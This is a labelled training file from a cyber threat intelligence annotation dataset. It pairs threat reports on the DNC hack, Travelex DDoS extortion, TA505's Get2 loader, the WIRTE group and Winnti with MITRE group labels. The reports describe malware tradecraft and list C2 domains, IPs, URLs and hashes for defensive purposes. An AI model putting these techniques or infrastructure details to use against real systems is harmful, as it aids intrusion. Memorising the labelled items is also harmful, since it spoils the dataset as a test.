source,url,doc_id,label,text
annoctr,annoctr/AnnoCTR/text/train/intel471_2016-06-17_who-hacked-the-democratic-national.txt,intel471_2016-06-17_who-hacked-the-democratic-national,G0007,"Who hacked the Democratic National Committee? Jun 17, 2016 By Mark Arena, CEO of Intel 471. **Who hacked the Democratic National Committee?** I’ll preface this post by saying that I possess no information on this incident beyond what has been mentioned in open sources. This post is my personal opinion and is based on my experience researching and tracking both state and non-state cyber threat actors. I’ll also add that [Intel 471](https://intel471.com) does not actively research and track threat actors that are involved with espionage and is focused on financially motivated cyber criminals and hacktivists/politically motivated threat actors. On June 14, the Washington Post published a [story](https://www.washingtonpost.com/world/national-security/russian-government-hackers-penetrated-dnc-stole-opposition-research-on-trump/2016/06/14/cf006cb4-316e-11e6-8ff7-7b6c1998b7a0\_story.html?hpid=hp\_hp-banner-main\_dnc-hackers-1145a-banner%3Ahomepage%2Fstory) that indicated Russian government hackers had hacked into the Democratic National Committee (DNC). The specific information linking the hack to the Russian government came from the cyber security company [CrowdStrike](https://www.crowdstrike.com/): > One group, which CrowdStrike had dubbed Cozy Bear, had gained access last summer and was monitoring the DNC’s email and chat communications, Alperovitch said. > > > The other, which the firm had named Fancy Bear, broke into the network in late April and targeted the opposition research files. > > I personally know a number of smart people who work at CrowdStrike and I trust them when they say that a specific intrusion or incident is linked to a specific hacking group. With regards to linking intrusion sets to groups, CrowdStrike uses an animal naming scheme to tie intrusion activity and intrusion sets to groups and countries. In this case CrowdStrike said that they observed intrusions in the DNC tied to the groups they call *Cozy Bear* and *Fancy Bear* where Bear signifies Russia. I have no doubts at all that CrowdStrike indeed observed intrusion set activity within the DNC’s environment that linked to these groups they had identified and were almost certainly actively tracking. **Guccifer 2.0: A spanner in the works** On June 15, an actor who calls himself *Guccifer 2.0* created a [Wordpress blog](https://guccifer2.wordpress.com) where he posted a number of claimed confidential reports from the DNC including one on Donald Trump. In the blog post, an effort appears to be made to say how easy it was to hack the DNC and called into question CrowdStrike who linked two intrusions of the DNC to the Russian government. For those that aren’t aware, the handle [*Guccifer*](https://en.wikipedia.org/wiki/Guccifer) was used by a Romanian hacker who was recently extradited to the United States. This actor was involved with hacking high profile people such as politicians and celebrities and publicly releasing their emails. *Guccifer* currently sits in a jail in Virginia awaiting sentencing. **Russia. Attribution is hard right?** When it comes to attribution of intrusions to groups or specific people, we are really talking about two things: * Attribution of the observed intrusion sets (malware, exploits etc) to known intrusion groups. This is where CrowdStrike tied this activity to the groups they call *Cozy Bear* and *Fancy Bear.* * Attribution of the threat grouping to a specific person, group/organization or nation state where in this case CrowdStrike has clearly singled out Russia. This is a lot harder than the previous point. On the first point, I have complete confidence that CrowdStrike is able to track and link specific intrusions tools to known groups which they actively track. On the second point, it is a little more unclear whether this activity is tied to the Russian government and I can’t really comment on that as I don’t have information that supports this or not. This type of attribution is done in a number of ways but is not limited to: * Tracking of specific targets/target sectors over a long period of time and mapping that against nation state objectives. Confidential and internal information within the DNC would be of clear interest to the Russian government and other governments. It might also be of interest to a politically motivated hacker who would want to discredit the DNC by publishing their sensitive information. * Researching intrusion activity and identifying operational security failures on behalf of the intrusion operators. A good example of this is where [iSIGHT Partners](https://isightpartners.com) was able to [tie](http://freebeacon.com/national-security/cyber-caliphate-hackers-not-linked-to-islamic-state/) a claimed Islamic State (ISIL) hacking group to a Russian group they track as APT28. **Guccifer 2.0 did it!** One thing for sure with *Guccifer 2.0* is that he clearly has demonstrated access to internal documents of the DNC. Given that, I believe there’s two possibilities: * One or both of the groups identified by CrowdStrike is tied to *Guccifer 2.0* and this is a disinformation campaign against CrowdStrike and the DNC. * *Guccifer 2.0* is a distinct threat actor who had access to the DNC’s systems at some point. At no way does this mean CrowdStrike was wrong with linking the activity they saw in the DNC’s environment. I’ve seen numerous occasions where organizations have been compromised by multiple different intrusion groups and the evidence of one intrusion group being active in a victim’s environment doesn’t mean another intrusion group can’t be active in the same environment at the same time. On *Guccifer 2.0* being a possible disinformation operation, I recommend closely looking at *Guccifer 2.0*’s writing. Based on the style and how it has been done, it looks like it was written by someone who doesn’t speak English as a first language and uses mannerisms used by people based in Eastern Europe or was purposely written like this. I also recommend reading the Twitter timeline for [pwnallthethings](https://twitter.com/pwnallthethings) which talks about claimed operational security (OPSEC) failures on behalf of *Guccifer 2.0* and various files that were uploaded online. I’ll add that initially I was surprised by how quickly a disinformation operation could possibly have been executed after the Washington Post article. **Final Remarks** I’ll finish things off by repeating that in my opinion the emergence of *Guccifer 2.0* does not at all conflict with CrowdStrike’s findings. *Guccifer 2.0* may be a separate actor or may be tied to one or both of the intrusion groups CrowdStrike claims were active inside the DNC."
annoctr,annoctr/AnnoCTR/text/train/intel471_2020-10-13_travelex-ddos-attack-lazarus-group.txt,intel471_2020-10-13_travelex-ddos-attack-lazarus-group,G0007,"Criminals posing as Lazarus Group threatened Travelex: Bitcoin or DDoS Oct 13, 2020 A group posing as notorious nation-state-linked hacking group “Lazarus Group” threatened to hit British foreign exchange company Travelex with a distributed-denial-of-service (DDoS) attack unless it paid 20 bitcoins. According to an email discovered by Intel 471 researchers, attackers threatened to hit Travelex with an “extremely powerful” attack that would “peak over 2 Tbps” until the company paid a ransom. The demand, which was sent in late August, asked for a value of approximately US $213,000. “It's a small price for what will happen when your whole network goes down,” the email read. “Is it worth it. You decide. Following the extortion email, the threat actor conducted a volumetric attack on a custom port of four IP addresses serving the company’s subdomains. Two days later, the attackers carried out another DNS amplification attack against Travelex using Google DNS servers. The email also said that if Travelex didn’t comply by a certain date, the ransom would “increase by 10 Bitcoin for each day after [the] deadline that passed without payment. A bitcoin wallet address in the email shows that Travelex did not pay the attackers at any point. While it's unclear whether or not the North Korea-backed group was responsible for the note, Intel 471 VP of Intelligence Michael DeBolt says it’s ""unlikely"" to be related to the nation-state. ""We've seen this come up quite a few times recently,"" DeBolt said. ""The attackers are trying to capitalize on the notoriety of well-known groups as a scare tactic to pressure victims into paying. The true actors or groups likely possess some DDoS capabilities that need to be taken seriously, so organizations should be prepared to deal with that sort of attack as part of their cybersecurity plan. The threat to Travelex comes as the company underwent one of the most notable ransomware attacks of the past year. In January, the company was [hit with REvil ransomware](https://www.cyberscoop.com/travelex-sodinokibi-ransomware/), forcing it to suspend all of its online services, including its app and internal email systems, for several weeks. Groups posing as nation-state hacking groups while threatening ransom-backed DDoS attacks have been bubbling up over the past year. In November 2019, New Zealand’s cybersecurity organization, CertNZ, [issued a warning](https://www.cert.govt.nz/it-specialists/advisories/ddos-extortion-campaign-targeting-financial-sector/) about ongoing extortion campaigns targeting companies in the financial sector. The threat actors claimed to represent the Russian hacker group Fancy Bear and demanded a ransom to avoid a DDoS attack. Additionally, the New Jersey Cybersecurity and Communications Integration Cell [issued an advisory](https://www.cyber.nj.gov/alerts-advisories/extortionists-claiming-to-be-apt-groups-threaten-ddos-attacks) in August on actors who targeted the finance and retail sectors with DDoS attacks, claiming to be members of Fancy Bear and Armada Collective. New Zealand-based enterprises [have seen a rash of DDoS attacks](https://www.stuff.co.nz/business/industries/122636840/metservice-anticipates-future-ddos-cyberattacks-in-coming-days) over the past few months. In August, the New Zealand stock exchange was hit by a DDoS attack that spanned several days and caused a disruption of some services. The Meteorological Service of New Zealand, news media company Stuff, public-service radio broadcaster Radio New Zealand and Australian bank Westpac Banking Corp have also been hit with DDoS attacks in recent weeks."
annoctr,annoctr/AnnoCTR/text/train/intel471_2020-10-13_travelex-ddos-attack-lazarus-group.txt,intel471_2020-10-13_travelex-ddos-attack-lazarus-group,G0032,"Criminals posing as Lazarus Group threatened Travelex: Bitcoin or DDoS Oct 13, 2020 A group posing as notorious nation-state-linked hacking group “Lazarus Group” threatened to hit British foreign exchange company Travelex with a distributed-denial-of-service (DDoS) attack unless it paid 20 bitcoins. According to an email discovered by Intel 471 researchers, attackers threatened to hit Travelex with an “extremely powerful” attack that would “peak over 2 Tbps” until the company paid a ransom. The demand, which was sent in late August, asked for a value of approximately US $213,000. “It's a small price for what will happen when your whole network goes down,” the email read. “Is it worth it. You decide. Following the extortion email, the threat actor conducted a volumetric attack on a custom port of four IP addresses serving the company’s subdomains. Two days later, the attackers carried out another DNS amplification attack against Travelex using Google DNS servers. The email also said that if Travelex didn’t comply by a certain date, the ransom would “increase by 10 Bitcoin for each day after [the] deadline that passed without payment. A bitcoin wallet address in the email shows that Travelex did not pay the attackers at any point. While it's unclear whether or not the North Korea-backed group was responsible for the note, Intel 471 VP of Intelligence Michael DeBolt says it’s ""unlikely"" to be related to the nation-state. ""We've seen this come up quite a few times recently,"" DeBolt said. ""The attackers are trying to capitalize on the notoriety of well-known groups as a scare tactic to pressure victims into paying. The true actors or groups likely possess some DDoS capabilities that need to be taken seriously, so organizations should be prepared to deal with that sort of attack as part of their cybersecurity plan. The threat to Travelex comes as the company underwent one of the most notable ransomware attacks of the past year. In January, the company was [hit with REvil ransomware](https://www.cyberscoop.com/travelex-sodinokibi-ransomware/), forcing it to suspend all of its online services, including its app and internal email systems, for several weeks. Groups posing as nation-state hacking groups while threatening ransom-backed DDoS attacks have been bubbling up over the past year. In November 2019, New Zealand’s cybersecurity organization, CertNZ, [issued a warning](https://www.cert.govt.nz/it-specialists/advisories/ddos-extortion-campaign-targeting-financial-sector/) about ongoing extortion campaigns targeting companies in the financial sector. The threat actors claimed to represent the Russian hacker group Fancy Bear and demanded a ransom to avoid a DDoS attack. Additionally, the New Jersey Cybersecurity and Communications Integration Cell [issued an advisory](https://www.cyber.nj.gov/alerts-advisories/extortionists-claiming-to-be-apt-groups-threaten-ddos-attacks) in August on actors who targeted the finance and retail sectors with DDoS attacks, claiming to be members of Fancy Bear and Armada Collective. New Zealand-based enterprises [have seen a rash of DDoS attacks](https://www.stuff.co.nz/business/industries/122636840/metservice-anticipates-future-ddos-cyberattacks-in-coming-days) over the past few months. In August, the New Zealand stock exchange was hit by a DDoS attack that spanned several days and caused a disruption of some services. The Meteorological Service of New Zealand, news media company Stuff, public-service radio broadcaster Radio New Zealand and Australian bank Westpac Banking Corp have also been hit with DDoS attacks in recent weeks."
annoctr,annoctr/AnnoCTR/text/train/intel471_2020-12-18_ta505-get2-loader-malware-december.txt,intel471_2020-12-18_ta505-get2-loader-malware-december,G0092,"TA505’s modified loader means new attack campaign could be coming Dec 18, 2020 After months of inactivity, hacking group TA505's Get2 Loader has sprung back into operation, possibly signaling that the group is ready for a new round of malicious activity. On December 14, 2020, the Get2 loader had resurfaced with new download and execute configuration parameters named ""LD"" and ""ED. Intel 471 last observed the loader in operation on September 14, 2020. The ""LD"" parameter reflectively loads a downloaded dynamic-link library (DLL) file into the address space of the current process and calls its entry point. The ""ED"" parameter copies the DLL into executable memory and invokes the entry point directly. The preexisting ""RD"" parameter that was used to inject the downloaded DLL into EXCEL.EXE can now perform injection into WINWORD.EXE as well. The reconfigured loader is meant to allow the group to carry out its operations without drawing the attention of enterprise defenses. In the past, it has been used to download the SDBbot, FlawedGrace and other malware. TA505 is a prolific Russian-speaking, financially-motivated group that is known for launching large-scale targeted attacks. The group [was most recently discovered](https://www.darkreading.com/attacks-breaches/ta505-targets-hr-departments-with-poisoned-cvs-/d/d-id/1337355) going after German-speaking targets with weaponized CVs. Intel 471 also observed the group going after targets in Japan, South Korea, United Arab Emirates in 2019. Once the group's malware or actions are caught by researchers or the press, the group tends to go silent in an effort to reconfigure its tools. Drawing from past experiences, Intel 471 believes that new, undiscovered malware campaigns will follow with the introduction of the reconfigured Get2 Loader. ""TA505 can be somewhat deliberate in how they operate, more so than most of the financially-motivated groups we track,"" said Intel 471 COO Jason Passwaters. ""Once things start ramping up like this, rest assured they are back at it with a target list in hand. The Intel 471 adversary intelligence on major threat groups such as TA505 and our unique insight into its capabilities, intent and motivations, can be leveraged by threat intelligence teams to remain proactive and resilient against attacks as cybercriminals modify TTPs."
annoctr,annoctr/AnnoCTR/text/train/lab52_2019-04-02_wirte-group-attacking-the-middle.txt,lab52_2019-04-02_wirte-group-attacking-the-middle,G0090,"WIRTE Group attacking the Middle East April 02, 2019 The Intelligence Development Group of [S2 Grupo](https://s2grupo.es/en/home/) has carried out an investigation on an actor from whom LAB52 has not been able to find references or similarities in open sources and who has been identified as **WIRTE**. The DFIR (Digital Forensics and Incident Response) team of S2 Grupo first identified this actor in August 2018 and since then the follow-up has been carried out during the last few months. This group attacks the Middle East and does not use very sophisticated mechanisms, at least in the campaign started in August 2018 which was monitored. It is considered unsophisticated by the fact that the scripts are unobtrusive, communications go unencrypted by HTTP, they use Powershell (increasingly monitored), and so on. Despite this apparently unsophisticated modus operandi compared to other actors, they manage to infect their victims and carry out their objectives. In addition, as will be seen during the report, the detection rate of some of the scripts in December 2018 by the main antivirus manufacturers is low, an aspect that must be highlighted. We must be aware that once these scripts are executed, it is when the behavior analysis of many solutions will detect them, but this fact has not been studied by LAB52. This actor in all the artifacts analyzed shows his victims a decoy document in Arabic with different themes. During the report these documents will be analyzed and who could be the objectives depending on the topic dealt with in the document. ### Technical analysis As indicated above, during the month of August 2018 S2 Grupo CERT we managed an incident aimed at the diplomacy of different Middle Eastern countries. The attackers used a malware made in Visual Basic Script (VBS) as a tool to control the victim. Starting from the study of this VBS from S2 Grupo CERT, the monitoring of this group was started, finding in other sources other artifacts from the same group but with different decoy documents and with different strategies of execution, persistence, and so on. S2 Grupo does not have enough information to make any type of attribution or authorship. It is associated that these artifacts are related because they reflect similarities from a technical and temporal point of view and because of the decoy documents used, since sometimes they are identical. One aspect observed during the investigation is that the attackers after running the VBS used it as an Empire post-exploitation framework (<https://github.com/EmpireProject/Empire>). A total of five scripts plus the one involved in the incident could be collected. Below we detail the main characteristics of each. #### Script 1: 617bbc71e5f0a645cbb8eeb6d4a1ece96ba0860c8ab5deda6a795e6ad244607a This first file can be seen in Virus Total and has a low detection (4/58). The last analysis took place on 12/12/2018. ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img01.png) In this case the file was uploaded from Palestine to Virus Total: ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img02-1.png) In the image you can see that it was uploaded through the web, from PS (Palestine) and also that it was uploaded for the first time on **5 Aug. 2018**. Network communication occurs over HTTP to the **micorsoft[.]store** domain to TCP/2082 port. This domain since it exists has resolved to the following ip addresses: * 104.31.78.17 * 104.31.79.17 * 185.86.79.243 Currently resolves to a Cloudflare address. Port 2082 is one of the ports allowed by Cloudflare for HTTP traffic. It should be noted that the first IP address 185.86.79.243 is geolocated in Ukraine. This IP address has been assigned to different domains, among them the malicious one. Apparently the attackers changed their IP address and hid behind Cloudflare at some point. In this script this communication information is all in the **RunPld() function**. This function aims to download the powershell code from the command and control server and execute it: ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_cod01.png) Another common function in these scripts is the writeDOC function. This function decodes the decoy document, write it to disk and show it to the victim. This document is encoded in base64 and embedded in the script itself in a variable. ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_cod02.png) The VBS script copies itself to APPDATA through the **copyVBS()** function: ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_cod03.png) **The script itself does not establish persistence** in its first execution, so either the attackers deploy it later when they execute powershell or fix it by transporting this script. The script once copied to APPDATA will have the following name: **Update.vbs**. On the other hand, if the script is running from APPDATA it does not show the document and only executes the RunPld() function which is the backdoor in powershell and that has been detailed previously. If it is not being executed from APPDATA it shows the DOC file “decoy”, it copies and executes the backdoor (script in powershell). When the victim executes the VBS file, a Word document will be opened with the following content (you can see on the left in Arabic and next to it the translation made by Google Translate): ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_en_img01.png) The document we have shown is intended to simulate that it was sent from the Ministry of Foreign Affairs of Saudi Arabia. Presumably, it seems that the addressee was the Ministry of Awqaf and Islamic Affairs of Kuwait, since (Kuwait – Jeddah) appears in the very signature of the document. It was also apparently addressed to the Kuwaiti Consulate of the Cooperation Council of the Arab States of the Gulf, a highly important body within the countries of the Persian Gulf. The text mentions that attached, the recipient will find a document from the Saudi Ministry of Foreign Affairs called “Hajj affairs”, which is of interest to all those Arab countries that have citizens who have interests in carrying out the pilgrimage to the Mecca. In addition, it encourages recipients to forward the document to other government organizations in countries with interests linked to the “Hajj” that have been approved by the same Ministry of Culture of Saudi Arabia. Presumably, the author intends to generate an infection among the “partner states” of Saudi Arabia; **the “target” of the issuer could be the members of the diplomatic corps of countries with interest in the “Hajj”** and especially the diplomats who are part of the Cooperation Council of the Arab States of the Gulf, since the issuer promotes the forwarding of the document to all interested parties. There are five fundamental pillars within the religion of Islam. One of them is the “Hajj”, which implies that all Muslims must visit Mecca at least once in their lifetime. This monument is located in the Jeddah region within Saudi Arabia. **The “Hajj” is significantly relevant to Muslims around the world**. Consequently, this text is attractive and of interest to both Shi’ite and Sunni Muslims. **The date of issuance of the document is relevant** as it was held in August, approximately two weeks before the great pilgrimage, just when thousands of people of Muslim faith would begin the pilgrimage to Jeddah in Saudi Arabia. Consequently, the chances of a possible victim opening the document increase significantly. #### Script 2: b4c20b56059a6c6762b4c99d04eb9177cb0a4707c58ef575817fb8b702f162aa This file in Virus Total has a low detection, 2/56, and the last analysis took place on 1 Dec. 2018. ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img04.png) In this case the file has been uploaded from Palestine to Virus Total: ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img05.png) In the image you can see that it was uploaded through the web, from PS (Palestine) and also that it has been uploaded for the first time on **08/25/2018**. The network communication in this case is also produced by HTTP to the domain **micorsoft[.]store** to the port tcp/2082. In this case the script has exactly the same code as the hash “617bbc71e5f0a645cbb8eeb6d4a1ece96ba0860c8ab5deda6a795e6ad244607a”. The only thing that varies is the decoy document that we can see below: ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img06.png) The information presented in the document is directly related to security issues and internal political affairs of Palestine. The main actors mentioned in the text are Hamas, Al Fatah and the Palestinian government. The information is an analytical summary of the current political situation in Palestine and even analyzes in geostrategic terms some current aspects. In addition, the document informs about the potential political strategies that the previously mentioned actors could undertake in the future. This type of information is highly relevant for **diplomats with political interests in the geographical area of Gaza and Palestine**. Consequently, it might be feasible for the document’s target audience to be diplomats, politicians and professionals from the defense sector. #### Script 3: b906f3c19c19e1b20b2d00bfb82b5453d5386d63b4db901ecade0f33dd38326a This file in Virus Total has a low detection, 3/56, and the last analysis took place on 1 Dec. 2018. ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img07.png) In this case the file was uploaded from Sweden to Virus Total: ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img08.png) In the image you can confirm that it has been uploaded by the community, from SE (Sweden) and also that it has been uploaded for the first time on **6 Nov. 2018**. The network communication in this case is also produced by HTTP to the **micorsoft[.]store** domain to the TCP/2082 port. In this case the script has exactly the same code as the previous two; the decoy document is identical to “617bbc71e5f0a645cbb8eeb6d4a1ece96ba0860c8ab5deda6a795e6ad244607a”, varying only from where it was uploaded and the dates regarding the first one. #### Script 4: 3d4a9466e9428ccb1cde05336f5366b29c7e5ae454ddaa4aa28c75c504c13d96 This file in Virus Total has a low detection, 8/56, and the last analysis took place on 12/12/2018. We can see that this document has a higher detection to the rest, although it is certain that some were not re-analyzed on December 12th. ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img09.png) In this case the file was uploaded from Palestine to Virus Total: ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img10.png) In the image you can see that it was uploaded through the web, from PS (Palestine) and also that it was uploaded for the first time on **08/25/2018**. The upload date matches the hash date “b4c20b56059a6c6762b4c99d04eb9177cb0a4707c58ef575817fb8b702f162aa”. The network communication in this case is produced by HTTP to the domain **office365-update[.]co** to TCP/2082 port. This hash changes the domain and then the structure of the script is different from the others, although it maintains functions and similarities with the rest. The ip addresses to which the domain has resolved are: * 104.24.108.64 * 104.24.109.64 In this case, the domain has always resolved to CloudFlare and it has not been observed that it has resolved to another IP address as in the previous case. The main of the script is simple and we are going to review its flow: ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_cod04.png) We are going to see what logic each of the functions has. The first function that we find is **writeTXT()**: ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_cod05.png) The function it does is to save, in a file named sys.txt and in a path set from the script, the content of the fileContent variable that is part of a powershell script. It should be noted that the write-to-file function used is **wirte**File(), which as can be seen has produced a typographical error that has been seen in several of the scripts that implement this functionality. The function **writeSCT()**: ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_cod06.png) The function creates an SCT (scriptlet) file on disk to execute through the JScript language a powershell whose code is in the TXT file written by the writeTXT() function. Regsvr32.exe is used to trigger the execution: ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_cod07.png) The writeDOC() function performs the same logic as in the hash “617bbc71e5f0a645cbb8eeb6d4a1ece96ba0860c8ab5deda6a795e6ad244607a” and which has already been explained. In this case the decoy document shown to the victim is the same as that presented in “b4c20b56059a6c6762b4c99d04eb9177cb0a4707c58ef575817fb8b702f162aa”. #### Script 5: 4f5d633604b8a3cceb7d582bab640d47e8a5898458c5c2f0e28adcdf01aabf33 This file has a higher detection rate than the previous ones: you can see that 20/58 antivirus identify it as harmful. ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img11.png) ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img12.png) In the image you can see that it has been uploaded through API, from the US and also that it has been uploaded for the first time on **2 Sept.2018**. The date of upload is after the artifacts uploaded from Palestine, but close in time. In this case you can see a reference to this script in a tweet (<https://twitter.com/ItsReallyNick/status/1036687952544448512>) by Nick Carr (@ItsReallyNick), where he details all the technical aspects of the script: ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img13.png) By viewing the tweet thread we can see how they indicate that in this case runs a VBScript #Houdini RAT and that the command and control server is hxxp: //149.28.14[.]103:535/ is-ready. When looking for which domains have resolved to this IP address it is observed that the only one categorized as malware is related to spdns.de and searching for this domain name we come to the analysis <https://gist.github.com/JohnLaTwC/ccdcbeb85649ef9feaae045482d694b9>(from @ JohnLaTwC) that shows how this domain is configured with port 535 and with HTTP requests from RAT Houdini. The domain was resolving to IP addresses until **August 30, 2018**. The fact that in this case the actor uses a Houdini varies from the rest of VBS found, which based their execution on a powershell script that received commands from a remote server and executed them, but even so there are several aspects that lead us to think that it is the same actor: * • There are matching function names: writeTXT, writeDOC, wirteFile (this is a very important indicator since it is the same typographical error). * • Then writeDOC has the same logic and, besides, the decoy document is also in Arabic. In this case the decoy document is different from the previous ones, so everything presupposes that the objective is different: ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img14.png) The document refers to information related to the Security Forces in the territory of northern Gaza involved in defending of the border. The information refers to an accreditation and decoration by Palestinian governmental authorities for their members of the law enforcement and security forces. The target of this malicious document could be **soldiers, police, professionals linked to the Ministry of Defense and members of the diplomatic corps in Gaza**. The current government within the Gaza Strip is Hamas, a party that has a military arm considered by different countries as a terrorist group. ### Indicators of compromise ![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img15.png)"
annoctr,annoctr/AnnoCTR/text/train/lab52_2019-05-16_winnti-group-geostrategic-analysis-and.txt,lab52_2019-05-16_winnti-group-geostrategic-analysis-and,G0044,"Winnti Group: Geostrategic and TTP (Tactics, Techniques and Procedures) May 16, 2019 **Executive Summary** --------------------- China is one of the world powers with more presence within the international market of the gaming sector, controlling the Southeast Asian market and even more than half of the global market of the Gaming sector. Winnti Group is currently considered to be an APT group allegedly attributed to the government of China ([1]). Among its various targets, it specializes in designing and executing cyber-espionage operations for companies in the Gaming sector in order to collect classified information on Game Design. **Geostrategic analysis of China and Winnti Group’s cyber attacks on Thailand’s gaming industry:** -------------------------------------------------------------------------------------------------- The increase in cyber-attacks within Southeast Asian countries is correlating with the progressive shift in the accumulation of the Gross Domestic Product towards the same area of Southeast Asia. The forecast on the evolution of the global economy can be seen reflected in the estimates of the percentages of GDP (Gross Domestic Product) or GDP (Gross Domestic Product) shown below ([2]): ![](https://lab52.es/blog/wp-content/uploads/2019/05/Captura-12.png) *Illustration 1 The Global Economy’s shifting centre of gravity.* ![](https://lab52.es/blog/wp-content/uploads/2019/05/Captura-13.png) *Illustration 2 Forecast of the center of gravity movement of the global economy* As the percentages on the map show, the evolution of the global distribution of GDP will be concentrated in the countries of Southeast Asia. In this same area, industry and the service sector will increase considerably by 2045. Innovations within the IT sector are and will continue to be highly confidential information for those companies and States that maintain an interest in economic control over the Southeast Asian area ([3]). The “gaming” sector has acquired a high relevance within the international market. The countries of Southeast Asia have acquired significant relevance in relation to their design and subsequent production. ([4]) As can be seen in the following graph, the evolution of the profitability of the global market of the gaming sector has been remarkably beneficial and with a clear forecast of growth: ![](https://lab52.es/blog/wp-content/uploads/2019/05/Captura-14.png) *Illustration 3 The Global Gaming Market* Within the constant growth of the sector, it can be seen that the subsector of the “gaming mobile sector” grows especially faster compared to Gaming PC or the videogames “console”. The following graph shows the generation of benefits by global regions: ![](https://lab52.es/blog/wp-content/uploads/2019/05/Captura-15.png) *Illustration 4 Distribution of the gaming market* The group of countries in the Asia-Pacific region has generated up to $71.4 billion, more than half of which has been generated by China ($37 Bn), surpassing the annual profits of the US within the “gaming” sector ([5 ]). In Southeast Asia, China controls 64% of sales related to the “Gaming” sector. Its main regional competitor is Japan and South Korea. Supposedly, the Chinese government, with the intention of maintaining growth and control within the international “gaming” market, has been attributed links with the activity of the APT Winnti Group. This group has as one of its main objectives to collect classified information from the “Game Designers” of the organizations of the gaming sector ([6]). The ESET company has published an investigation about a Winnti Group campaign where the company “Thai developer Electronics Extreme” was cyber-attacked and could have distributed infected versions of its product called “Infestation Gameplay”. As the following graph shows, it can be seen that the highest percentage of infected products have been distributed in Thailand. The percentages published by ESET are as follows ([1]): ![](https://lab52.es/blog/wp-content/uploads/2019/05/Captura-16.png) *Illustration 4 Countries most infected by the Winnti Group campaign* The graph above shows a high percentage of cyber-attacks by the Winnti Group against companies in the gaming sector in Thailand ([1]). One of the most unique characteristics of the gaming sector within Thailand is that the companies are not global or large multinationals. The vast majority of companies in Thailand’s gaming sector are SMEs with Thai capital. However, these same companies usually work with international organizations such as Nintendo or Xbox, among others. Another feature of high value within the gaming market in Thailand are the companies focused on the behavioral study of videogame consumers, such as “Asiasoft”. The Thai gaming industry may be of high interest to a state in terms of cyber espionage, since its collaboration with large international companies and its research on gaming consumers could be of high value to the international gamer industry ([7]). **Conclusions** --------------- As we could realize in this research, almost all the sectors would be a relevant target for a threat group. Currently, the globalized market is able to interconnect all the companies of a specific field. This fact means that, day by day, the targets of the threat groups are more extended and specialized. Apparently, the gaming sector would look like as a non-significant sector in the worldwide economy. However, as we could analyze there is an APT specialized within it. We conclude that all the sectors are relevant in the current globalized economy and consequently would be a potential target for some APT. Another relevant conclusion in this research, it is the strategy applied by Winnti Group to compromise as much organizations as they can. The campaign aimed an important gaming supply chain organization to reach high rates of victims, as this organization distributed massively the infected product. Wherefore, the national and international suppliers are an important target for many APT. **Indicators of Compromise** ---------------------------- **Samples of compromised files ([1]):** | SHA-1 | Compile Time (UTC) | RC4 Key | PayloadSH1 | | 7cf41b1acfb05064518a2ad9e4c16fde9185cd4b | Tue Nov 13 10:12:58 2018 | 1729131071 | 8272c1f4 | | 7f73def251fcc34cbd6f5ac61822913479124a2a | Wed Nov 14 03:50:18 2018 | 19317120 | 44260a1d | | dac0bd8972f23c9b5f7f8f06c5d629eac7926269 | Tue Nov 27 03:05:16 2018 | 1729131071 | 8272c1f4 | Payload samples: | **SHA-1** | **C&C Server URL** | | a045939f53c5ad2c0f7368b082aa7b0bd7b116da | https://bugcheck.xigncodeservice[.]com/Common/Lib/Common\_bsod.php | | a260dcf193e747cee49ae83568eea6c04bf93cb3 | https://bugcheck.xigncodeservice[.]com/Common/Lib/Common\_Include.php | | dde82093decde6371eb852a5e9a1aa4acf3b56ba | https://bugcheck.xigncodeservice[.]com/Common/Lib/common.php | | 8272c1f41f7c223316c0d78bd3bd5744e25c2e9f | https://nw.infestexe[.]com/version/last.ph | | 44260a1dfd92922a621124640015160e621f32d5 | https://dump.gxxservice[.]com/common/up/up\_base.php | Dropper download by: api.goallbandungtravel[.]com. | **ID** | **Description** | | T1195 | Supply Chain Compromise | | T1050 | New Service | | T1022 | Data Encrypted | | T1079 | Multilayer Encryption | | T1032 | Standard Cryptographic Protocol (RC4, RC5) | | T1043 | Commonly Used Port (80,443) | | T1009 | Binary Padding | **Mitre ATT&TTP Matrix** ------------------------ In the following table you can check the TTPs associated with this group following the ATT & CK Framework of MITRE: | **Domain** | **ID** | **Name** | **Description** | | Enterprise | T1195 | Supply Chain Compromise | Winnti Has Compromised software provider companies | | Enterprise | T1085 | Rubdll32 | Winnti modifies Windows Dll files to persistance | | Enterprise | T1050 | New Service | Winnti creates a new service that runs in background | | Enterprise | T1060 | Registry Run Keys / Start folder | Winnti modify Windows Registry to check if should stop | | Enterprise | T1102 | Web Service | Winnti contact C&C | | Enterprise | T1140 | Deobfuscate / Decode Files or Information | Winnti send information ofuscated | | Enterprise | T1012 | Query Registry | Winnti modifies Windows dll files to persistence | | Enterprise | T1024 | Custom Cryptographic | Winnti communicates the C&C with base64-encoded data | | Enterprise | TT1001 | Data Obfuscation | Winnti uses Cryptographic Protocol (RC4, RC5) | | Enterprise | T1219 | Remote Access Tools | Winnti installs backdoor that communicates with C&C to download executable code | **References:** --------------- [1] Léveillé, M. E. (2019, 11 March). Gaming industry still in the scope of attackers in Asia. <https://www.welivesecurity.com/2019/03/11/gaming-industry-scope-attackers-asia/> [2] Barnabás, C. S. A. B. A. (2017). CHINA’S RISE AND THE GEOPOLITICS OF SOUTHEAST ASIA. Distant Magazine. [3] BBVA. (2014). The BBVA Research Geo World Report A Visual Guide to Geopolitical Affairs. <https://www.bbvaresearch.com/wp-content/uploads/2014/12/Geo-World-Report-2H-2014.pdf> [4] 